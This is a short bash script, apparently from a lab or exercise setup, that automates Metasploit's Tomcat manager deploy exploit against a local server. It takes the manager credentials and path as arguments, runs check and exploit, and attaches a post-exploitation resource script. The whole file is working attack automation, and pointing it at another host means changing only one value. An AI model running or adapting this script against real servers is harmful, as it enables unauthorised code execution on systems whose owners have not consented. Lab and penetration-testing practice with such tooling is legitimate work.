#!/bin/bash

msfconsole -q -x "use exploit/multi/http/tomcat_mgr_deploy;
set AutoRunScript multi_console_command -rc ./after.rc;
set RHOST 127.0.0.1;
set RPORT 8080;
set HttpUsername $1;
set HttpPassword $2;
set PATH $3;
set target 1;
check;
exploit;
exit"

if [ $? -ne 0 ]; then
	echo -e "\n Something went wrong"
	exit 1
fi

exit 0
